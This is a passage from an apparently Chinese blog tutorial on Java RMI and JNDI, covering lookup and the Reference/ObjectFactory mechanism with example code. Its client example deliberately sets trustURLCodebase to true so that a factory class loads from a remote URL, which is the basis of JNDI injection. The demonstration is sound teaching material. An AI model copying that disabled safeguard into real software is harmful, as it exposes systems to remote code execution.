<li>通过 <strong>DNS</strong> 查询记录（如 MX&#x2F;TXT）</li>
</ul>
<p>都可以通过 JNDI 实现统一的访问方式。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/08/25/Java%20RMI%20&%20JNDI/images/JNDI.png"
                      alt="JNDI"
                ></p>
<h3 id="JNDI-的体系架构"><a href="#JNDI-的体系架构" class="headerlink" title="JNDI 的体系架构"></a>JNDI 的体系架构</h3><p>JNDI 的架构类似 JDBC，分为 <strong>API 层</strong> 和 <strong>SPI（服务提供者接口）层</strong>。</p>
<h4 id="应用编程接口（API）"><a href="#应用编程接口（API）" class="headerlink" title="应用编程接口（API）"></a>应用编程接口（API）</h4><p>开发者使用的统一接口，分布在 <code>javax.naming.*</code> 与 <code>javax.naming.directory.*</code> 等包中：</p>
<ul>
<li><strong><code>Context</code></strong> ：命名操作（<code>lookup</code>、<code>bind</code>、<code>rebind</code>、<code>unbind</code>、<code>list</code> 等）。</li>
<li><strong><code>DirContext</code></strong> ：目录扩展（在命名之上支持<strong>属性</strong>与<strong>搜索</strong>）。</li>
<li><strong><code>InitialContext</code></strong> ：通用入口上下文（基于环境参数定位到具体 Provider）。</li>
<li><strong><code>InitialDirContext</code></strong> ：用于目录服务的入口类，<strong>实现</strong> <code>DirContext</code>（并继承 <code>InitialContext</code>），便于直接进行目录操作。</li>
</ul>
<blockquote>
<p>关联概念</p>
<ul>
<li><strong>Naming Service（命名服务）</strong> ：名称 → 对象&#x2F;引用 的映射系统（如文件系统、DNS、RMI Registry、COSNaming）。</li>
<li><strong>Binding（绑定）</strong> ：一次具体的“名称 ↔ 对象&#x2F;引用”映射。</li>
<li><strong>Context（上下文）</strong> ：一组绑定的容器，支持层级（子上下文）。</li>
<li><strong>Reference（引用）</strong> ：JNDI 的结构化引用对象，可由 <code>ObjectFactory</code> 还原为真正实例。</li>
</ul>
</blockquote>
<h4 id="服务提供者接口（SPI）"><a href="#服务提供者接口（SPI）" class="headerlink" title="服务提供者接口（SPI）"></a>服务提供者接口（SPI）</h4><p>SPI 让不同协议&#x2F;产品以<strong>可插拔 Provider</strong> 接入 JNDI，屏蔽实现差异。常见 Provider（<strong>Provider 类</strong>属于<strong>实现层</strong>，通常在 <code>com.sun.jndi.*</code>）：</p>
<ul>
<li><strong>LDAP</strong>（目录）：<code>com.sun.jndi.ldap.LdapCtxFactory</code>（<code>ldap://</code>&#x2F;<code>ldaps://</code>）</li>
<li><strong>RMI Registry</strong>（命名）：<code>com.sun.jndi.rmi.registry.RegistryContextFactory</code>（<code>rmi://</code>）</li>
<li><strong>DNS</strong>（命名）：<code>com.sun.jndi.dns.DnsContextFactory</code>（<code>dns://</code>）</li>
<li><strong>CORBA COSNaming</strong>（命名）：<code>com.sun.jndi.cosnaming.CNCtxFactory</code>（<code>iiop://</code>）</li>
<li><strong>应用服务器命名空间</strong>（命名）：<code>java:comp/env</code>、<code>java:module</code>、<code>java:app</code>、<code>java:global</code>（容器受控资源）</li>
</ul>
<h3 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h3><h4 id="远程对象查找"><a href="#远程对象查找" class="headerlink" title="远程对象查找"></a>远程对象查找</h4><p><code>InitialContext</code> 是 JNDI 的入口类（<code>javax.naming.InitialContext</code>），<strong>实现了 <code>Context</code> 接口</strong>。拿到它之后，就可以对命名&#x2F;目录执行 <code>lookup</code>、<code>bind</code> 等操作。</p>
<p>它会根据传入的环境参数，或<strong>名称本身的 URL 前缀</strong>（如 <code>ldap://</code>、<code>rmi://</code>、<code>dns://</code>），选择合适的 Provider。</p>
<p>构造方法有：</p>
<ul>
<li><code>InitialContext()</code>：按默认环境创建入口（在应用服务器中通常指向 <code>java:comp/env</code> 等受控命名空间）。</li>
<li><code>InitialContext(Hashtable&lt;?,?&gt; env)</code>：显式提供 Provider、地址、认证方式等环境参数。</li>
<li><code>InitialContext(boolean lazy)</code>：<strong>受保护构造器</strong>，用于子类延迟初始化；业务代码一般不会直接用。</li>
</ul>
<p>常用操作（继承自 <code>Context</code> 接口）：</p>
<ul>
<li><code>lookup(String name)</code>：按名查对象（最常用）。</li>
<li><code>bind(String name, Object obj)</code>：首次绑定。</li>
<li><code>rebind(String name, Object obj)</code>：覆盖已有绑定。</li>
<li><code>unbind(String name)</code>：删除绑定。</li>
<li><code>list(String name)</code> &#x2F; <code>listBindings(String name)</code>：列出某上下文内的名称&#x2F;绑定详情。</li>
</ul>
<p>例如服务端在 RMI 注册中心注册了一个远程对象：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ① 导出并注册（服务端）</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.*;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="type">MyRemote</span> <span class="variable">impl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyRemoteImpl</span>();           <span class="comment">// MyRemote 继承 java.rmi.Remote</span></span><br><span class="line"><span class="type">MyRemote</span> <span class="variable">stub</span> <span class="operator">=</span> (MyRemote) UnicastRemoteObject.exportObject(impl, <span class="number">0</span>); <span class="comment">// 导出为远程对象</span></span><br><span class="line">LocateRegistry.createRegistry(<span class="number">1099</span>).rebind(<span class="string">&quot;myService&quot;</span>, stub);       <span class="comment">// 绑定到 RMI Registry</span></span><br></pre></td></tr></table></figure></div>

<p>那么我们可以通过 <code>InitialContext</code> 的统一接口 <code>lookup</code> 来查找远程对象并调用，而 JNDI 会通过 URL 中的协议名称调用 RMI 来查找获取远程类。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ② 通过 JNDI 统一接口查找（客户端）</span></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line"><span class="type">MyRemote</span> <span class="variable">remote</span> <span class="operator">=</span> (MyRemote) ctx.lookup(<span class="string">&quot;rmi://localhost:1099/myService&quot;</span>);</span><br><span class="line">remote.doSomething();</span><br></pre></td></tr></table></figure></div>

<h4 id="References-机制"><a href="#References-机制" class="headerlink" title="References 机制"></a>References 机制</h4><p><code>javax.naming.Reference</code> 表示一种“对象引用”，也就是告诉 JNDI 系统：<strong>“这个条目代表的对象不是现在直接提供的，而是你可以根据这些信息动态构造出来的。”</strong></p>
<p><code>Reference</code> 用于在 JNDI 注册中心中保存“<strong>不是立即反序列化，而是等待用工厂类还原</strong>”的对象引用。常用于<strong>延迟加载</strong>或<strong>远程查找</strong>过程中，指向某个类的构建方式。</p>
<p><code>Reference</code> 提供了多个构造函数重载，用到<strong>参数</strong>有：</p>
<ul>
<li><p><code>className</code>：希望最终还原成的<strong>目标类型</strong>（FQCN）。</p>
</li>
<li><p><code>factory</code>：用于把 <code>Reference</code> 变成对象的 <strong><code>ObjectFactory</code> 实现类</strong>（FQCN）。</p>
</li>
<li><p><code>factoryLocation</code>：工厂类所在位置（URL 等），<strong>现代 JDK 默认禁止</strong>从远程 codebase 加载。</p>
</li>
<li><p><code>RefAddr</code>：传给工厂的<strong>键值参数</strong>；可用 <code>StringRefAddr</code>、<code>BinaryRefAddr</code>。</p>
<ul>
<li><code>new StringRefAddr(&quot;key&quot;, &quot;value&quot;)</code>：字符串参数最常见。</li>
<li><code>new BinaryRefAddr(&quot;key&quot;, byte[])</code>：二进制参数。</li>
</ul>
</li>
</ul>
<p><code>Reference</code> 的<strong>构造函数</strong>有：</p>
<ul>
<li><p><code>Reference(String className)</code>：仅指定<strong>目标类名</strong>。常与后续 <code>add()</code> 补充地址项配合使用。</p>
</li>
<li><p><code>Reference(String className, RefAddr addr)</code>：目标类名 + <strong>一个地址项</strong>（<code>RefAddr</code>），常见为 <code>new StringRefAddr(&quot;k&quot;,&quot;v&quot;)</code>。</p>
</li>
<li><p><code>Reference(String className, String factory, String factoryLocation)</code>：目标类名 + <strong>工厂类</strong>（需实现 <code>ObjectFactory</code>）+ <strong>工厂位置</strong>（通常是 URL；现代 JDK 默认<strong>不信任远程 codebase</strong>）。</p>
</li>
<li><p><code>Reference(String className, RefAddr addr, String factory, String factoryLocation)</code>：目标类名 + <strong>一个地址项</strong> + 工厂类&#x2F;位置。</p>
</li>
</ul>
<p><code>Reference</code> 的<strong>常用方法</strong>有：</p>
<ul>
<li><code>void add(RefAddr addr)</code> &#x2F; <code>void add(int posn, RefAddr addr)</code>：追加&#x2F;按索引插入地址项（<strong>保持顺序</strong>很重要）。</li>
<li><code>RefAddr get(int posn)</code>：按索引取地址。</li>
<li><code>RefAddr get(String addrType)</code>：按 <strong>地址类型</strong>（<code>RefAddr.getType()</code>）取<strong>第一个匹配</strong>。</li>
<li><code>Enumeration&lt;RefAddr&gt; getAll()</code>：遍历全部地址项。</li>
<li><code>int size()</code>：地址项数量。</li>
<li><code>Object remove(int posn)</code>：删除并返回索引处的地址（历史原因返回 <code>Object</code>，实际为 <code>RefAddr</code>）。</li>
<li><code>void clear()</code>：清空地址项。</li>
<li><code>String getClassName()</code> &#x2F; <code>getFactoryClassName()</code> &#x2F; <code>getFactoryClassLocation()</code>：分别取目标类名、工厂类名与位置。</li>
<li><code>String toString()</code>：调试用字符串。</li>
</ul>
<p><strong>下面以一个例子说明 JNDI References 机制。</strong></p>
<hr>
<p><strong>服务端</strong>把 <code>Reference</code>（含参数）注册到 RMI Registry；</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 文件：Server.java</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.BinaryRefAddr;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Server</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(</span><br><span class="line">                <span class="string">&quot;java.lang.Object&quot;</span>,  <span class="comment">// 目标类型名：只是个标识，这里随便给个安全的</span></span><br><span class="line">                <span class="string">&quot;EchoFactory&quot;</span>,                 <span class="comment">// 工厂类（客户端 classpath 中应能加载到）</span></span><br><span class="line">                <span class="string">&quot;http://localhost:8000/&quot;</span>       <span class="comment">// 不使用远程 URL（现代 JDK 默认也不信任）</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 追加两个地址项（保持顺序）</span></span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;greeting&quot;</span>, <span class="string">&quot;hello-jndi&quot;</span>));</span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">BinaryRefAddr</span>(<span class="string">&quot;nonce&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 用 ReferenceWrapper 包装后绑定到 RMI 注册中心</span></span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">wrapped</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(ref);</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>).rebind(<span class="string">&quot;hello&quot;</span>, wrapped);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;RMI registry bound at rmi://localhost:1099/hello&quot;</span>);</span><br><span class="line">        Thread.sleep(Long.MAX_VALUE); <span class="comment">// 挂起方便测试</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>首先是构造 <code>Reference</code> 对象，其中涉及到的参数有：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(</span><br><span class="line">        <span class="string">&quot;java.lang.Object&quot;</span>,  <span class="comment">// 目标类名（标识符，实际不重要）</span></span><br><span class="line">        <span class="string">&quot;EchoFactory&quot;</span>,       <span class="comment">// 工厂类（必须实现 ObjectFactory）</span></span><br><span class="line">        <span class="string">&quot;http://localhost:8000/&quot;</span> <span class="comment">// 工厂类所在位置（URL）</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure></div>

<ul>
<li><p><strong>className &#x3D; “java.lang.Object”</strong><br> 这个只是个占位符，告诉 JNDI “我想要一个对象”。在这里不严格要求必须真能构造 <code>Object</code> 类型，关键看工厂类。</p>
</li>
<li><p><strong>factory &#x3D; “EchoFactory”</strong><br> 这是关键：告诉 JNDI 要调用哪个 <code>ObjectFactory</code> 实现类的 <code>getObjectInstance()</code> 方法。</p>
<ul>
<li>如果客户端 classpath 上有 <code>EchoFactory</code> 类，就会直接加载并调用。</li>
<li>如果本地没有，但 <code>factoryLocation</code> 提供了 URL，JNDI 会尝试通过 HTTP 下载该类（⚠️现代 JDK 默认禁止远程 codebase）。</li>
</ul>
</li>
<li><p><strong>factoryLocation &#x3D; “<a class="link"   target="_blank" rel="noopener" href="http://localhost:8000/" >http://localhost:8000/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>“</strong><br> 这是工厂类的位置（Codebase）。</p>
<ul>
<li>在老版本 JDK，会真的去这个 URL 下载字节码，然后加载执行。</li>
<li>在新版本（JDK 8u191+），<code>trustURLCodebase</code> 默认是 <code>false</code>，所以这里不会去下载。</li>
</ul>

  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content markdown-body">
      <ul>
<li><code>classFactoryLocation</code> 提供 classes 数据的地址可以是 <code>file/ftp/http</code> 等协议。</li>
<li>URL 必须以 <code>/</code> 结尾，这是由 <code>URLClassLoader</code> 所觉得的。<ul>
<li><strong>以 <code>/</code> 结尾</strong> → 被当作<strong>目录</strong>代码库（directory codebase），加载类时会直接请求：<code>GET /EchoFactory.class</code> ✅</li>
<li><strong>不以 <code>/</code> 结尾</strong> → 被当作<strong>JAR 文件</strong>代码库（jar codebase），先去请求“基 URL”本身：<code>GET /</code>，尝试把它当 JAR 读头部（看是不是 ZIP&#x2F;JAR 的 <code>PK..</code> 魔数）。不是 JAR 就不会继续拼 <code>EchoFactory.class</code>，所以你只看到 <code>GET /</code> ❌</li>
</ul>
</li>
</ul>

    </div>
  </div></li>
</ul>
<p>工厂类在创建对象的时候可能还需要一些参数，因为我们可能还要添加 <code>RefAddr</code> 参数。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;greeting&quot;</span>, <span class="string">&quot;hello-jndi&quot;</span>));</span><br><span class="line">ref.add(<span class="keyword">new</span> <span class="title class_">BinaryRefAddr</span>(<span class="string">&quot;nonce&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;));</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>StringRefAddr(&quot;greeting&quot;, &quot;hello-jndi&quot;)</code>：工厂类可以通过 <code>ref.get(&quot;greeting&quot;)</code> 获取 <code>&quot;hello-jndi&quot;</code>。</li>
<li><code>BinaryRefAddr(&quot;nonce&quot;, new byte[]&#123;1,2,3,4&#125;)</code>：工厂类可以通过 <code>ref.get(&quot;nonce&quot;)</code> 拿到字节数组。</li>
</ul>
<p>最后我们需要将 <code>Reference</code> 注册到 RMI Registry 中。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ReferenceWrapper</span> <span class="variable">wrapped</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(ref);</span><br><span class="line">LocateRegistry.createRegistry(<span class="number">1099</span>).rebind(<span class="string">&quot;hello&quot;</span>, wrapped);</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>ReferenceWrapper</strong> ：把 <code>Reference</code> 包装成 RMI 可导出的对象（因为 RMI Registry 只能存 <code>Remote</code> 对象）。</li>
<li><code>rebind(&quot;hello&quot;, wrapped)</code>：把这个引用对象挂在 RMI 注册中心的 <code>hello</code> 名字下。</li>
</ul>
<p>这样，别的客户端就能通过 <code>rmi://localhost:1099/hello</code> 取到这个 <code>Reference</code>。</p>
<hr>
<p><strong>客户端</strong>通过 <code>InitialContext</code> 的 <code>lookup</code> 方法查找 <code>Reference</code> 对象。 </p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 文件：Client.java</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 显式启用远程 codebase 信任</span></span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.cosnaming.object.trustURLCodebase&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ctx.lookup(<span class="string">&quot;rmi://localhost:1099/hello&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;lookup result = &quot;</span> + obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在 <strong>JDK 8u121 之后</strong>，<code>com.sun.jndi.rmi.object.trustURLCodebase</code> 和 <code>com.sun.jndi.cosnaming.object.trustURLCodebase</code> 这两个系统属性的默认值改成了 <strong>false</strong>，所以 JNDI <strong>不会</strong>去远程 URL 下载类。</p>
<p>为了展示远程加载类的效果，我们需要手动开启这两个选项。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 显式启用远程 codebase 信任</span></span><br><span class="line">System.setProperty(<span class="string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">System.setProperty(<span class="string">&quot;com.sun.jndi.cosnaming.object.trustURLCodebase&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>之后通过 <code>InitialContext</code> 的 <code>lookup</code> 方法查找 <code>Reference</code> 对象。 </p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ctx.lookup(<span class="string">&quot;rmi://localhost:1099/hello&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>ctx.lookup(&quot;rmi://...&quot;)</code> → 访问 RMI Registry → 拿到服务端注册的 <code>Reference</code> 对象。</li>
<li>JNDI 识别这是个 <code>Reference</code>，于是调用 <code>NamingManager.getObjectInstance(ref, ...)</code>。</li>
<li>发现 <code>ref.getFactoryClassName() = &quot;EchoFactory&quot;</code> → 去加载并实例化工厂类。</li>
</ul>
<hr>
<p>在 JNDI 里，<code>javax.naming.spi.ObjectFactory</code> 是一个 <strong>接口</strong>。它的作用是<strong>根据一个 <code>Reference</code> 或者其他描述信息，构造出真正的 Java 对象。</strong></p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 该接口表示“用于创建对象的工厂”。</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * JNDI 框架允许通过 &lt;em&gt;对象工厂（object factories）&lt;/em&gt; 动态加载对象实现。</span></span><br><span class="line"><span class="comment"> * 例如：在命名空间中查找一台打印机时，如果打印服务把打印机名称绑定为 Reference，</span></span><br><span class="line"><span class="comment"> * 则可以用这个 Reference 来创建一个打印机对象，这样 lookup 的调用者在查找完成后</span></span><br><span class="line"><span class="comment"> * 就能直接对该打印机对象进行操作。</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * 一个 &lt;tt&gt;ObjectFactory&lt;/tt&gt; 负责创建某一特定类型的对象。</span></span><br><span class="line"><span class="comment"> * 在上面的例子中，你可能会有一个 PrinterObjectFactory 来创建 Printer 对象。</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * 对象工厂必须实现 &lt;tt&gt;ObjectFactory&lt;/tt&gt; 接口。此外，该工厂类必须是 public，</span></span><br><span class="line"><span class="comment"> * 并且必须具有一个 public 的无参构造函数。</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * 对象工厂的 &lt;tt&gt;getObjectInstance()&lt;/tt&gt; 方法可能会被多次调用，且每次的参数可能不同。</span></span><br><span class="line"><span class="comment"> * 其实现应当是线程安全的。</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * 本类文档中提到的 URL，指的是 RFC 1738 及相关 RFC 所定义的 URL 字符串。</span></span><br><span class="line"><span class="comment"> * 它只要符合该语法即可，并不保证一定能被 java.net.URL 类或 Web 浏览器所支持。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Rosanna Lee</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Scott Seligman</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> NamingManager#getObjectInstance</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> NamingManager#getURLContext</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> ObjectFactoryBuilder</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> StateFactory</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 1.3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ObjectFactory</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 使用给定的位置或引用信息创建一个对象。</span></span><br><span class="line"><span class="comment">     * &lt;p&gt;</span></span><br><span class="line"><span class="comment">     * 该对象的特殊需求可通过 &lt;code&gt;environment&lt;/code&gt; 传入。</span></span><br><span class="line"><span class="comment">     * 例如用户身份信息就是一种环境属性。</span></span><br><span class="line"><span class="comment">     * &lt;p&gt;</span></span><br><span class="line"><span class="comment">     * &lt;tt&gt;NamingManager.getObjectInstance()&lt;/tt&gt; 将依次加载对象工厂并调用本方法，</span></span><br><span class="line"><span class="comment">     * 直到某个工厂返回非 null 的结果为止。</span></span><br><span class="line"><span class="comment">     * 当某个对象工厂抛出异常时，该异常会被传递给</span></span><br><span class="line"><span class="comment">     * &lt;tt&gt;NamingManager.getObjectInstance()&lt;/tt&gt; 的调用者</span></span><br><span class="line"><span class="comment">     * （且不会继续查找其他可能返回非 null 的工厂）。</span></span><br><span class="line"><span class="comment">     * 对象工厂只有在确信自己就是唯一被期望使用的工厂，且不应再尝试其他工厂时，</span></span><br><span class="line"><span class="comment">     * 才应当抛出异常。若本工厂无法基于所给参数创建对象，则应返回 null。</span></span><br><span class="line"><span class="comment">     * &lt;p&gt;</span></span><br><span class="line"><span class="comment">     * &lt;em&gt;URL 上下文工厂（URL context factory）&lt;/em&gt; 是一种特殊的 ObjectFactory，</span></span><br><span class="line"><span class="comment">     * 用于创建用于解析 URL 的上下文，或创建由 URL 指定位置的对象。</span></span><br><span class="line"><span class="comment">     * URL 上下文工厂的 &lt;tt&gt;getObjectInstance()&lt;/tt&gt; 必须遵循以下规则：</span></span><br><span class="line"><span class="comment">     * &lt;ol&gt;</span></span><br><span class="line"><span class="comment">     *   &lt;li&gt;如果 